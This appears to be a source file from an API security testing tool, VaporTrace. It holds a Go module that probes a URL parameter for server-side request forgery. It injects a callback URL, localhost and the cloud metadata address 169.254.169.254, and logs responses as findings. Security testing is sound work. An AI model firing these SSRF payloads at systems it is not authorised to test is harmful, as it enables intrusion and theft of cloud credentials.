/*
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'BSL', 'change_date': '2033-02-17', 'convert_to': 'Apache-2.0'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
*/

package logic

import (
	"fmt"
	"net/http"
	"net/url"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

type SSRFContext struct {
	TargetURL string
	ParamName string
	Callback  string
}

type SSRFResult struct {
	Tested   int
	Findings int
	Failed   int
	Complete bool
}

func (s *SSRFContext) Probe() {
	// FIX: Removed pterm
	utils.TacticalLog("[cyan]API7: Server-Side Request Forgery Tracker Started[-]")

	client := *GlobalClient
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	payloads := []string{
		s.Callback,
		"http://127.0.0.1:80",
		"http://169.254.169.254/latest/meta-data/",
	}

	result := SSRFResult{Complete: true}

	for _, payload := range payloads {
		if payload == "" {
			continue
		}
		result.Tested++

		u, _ := url.Parse(s.TargetURL)
		q := u.Query()
		q.Set(s.ParamName, payload)
		u.RawQuery = q.Encode()
		fuzzedURL := u.String()

		req, _ := http.NewRequest("GET", fuzzedURL, nil)
		if CurrentSession.AttackerToken != "" {
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", CurrentSession.AttackerToken))
		}

		resp, err := client.Do(req)
		if err != nil {
			result.Failed++
			continue
		}

		if resp.StatusCode < 500 {
			if payload == "http://127.0.0.1:80" || payload == "http://169.254.169.254/latest/meta-data/" {
				utils.RecordFinding(db.Finding{
					Phase:   "PHASE IV: INJECTION",
					Command: "ssrf", // Zero-Touch Trigger
					Target:  s.TargetURL,
					Details: fmt.Sprintf("SSRF Internal Access: %s", payload),
					Status:  "CRITICAL",
				})
			} else {
				utils.RecordFinding(db.Finding{
					Phase:   "PHASE IV: INJECTION",
					Command: "ssrf", // Zero-Touch Trigger
					Target:  s.TargetURL,
					Details: "SSRF Callback Triggered",
					Status:  "POTENTIAL CALLBACK",
				})
			}
			result.Findings++
			// Allow batch rendering cycle to complete before next finding
			time.Sleep(50 * time.Millisecond)
		}
		resp.Body.Close()
	}

	switch {
	case result.Tested == 0:
		result.Complete = false
		utils.TacticalLog("[red]SSRF:[-] Probe did not run (no valid payloads).")
	case result.Findings > 0:
		utils.TacticalLog(fmt.Sprintf("[green]SSRF COMPLETE:[-] tested=%d findings=%d failed=%d", result.Tested, result.Findings, result.Failed))
	default:
		utils.TacticalLog(fmt.Sprintf("[yellow]SSRF COMPLETE:[-] tested=%d findings=0 failed=%d (no SSRF evidence)", result.Tested, result.Failed))
	}
}
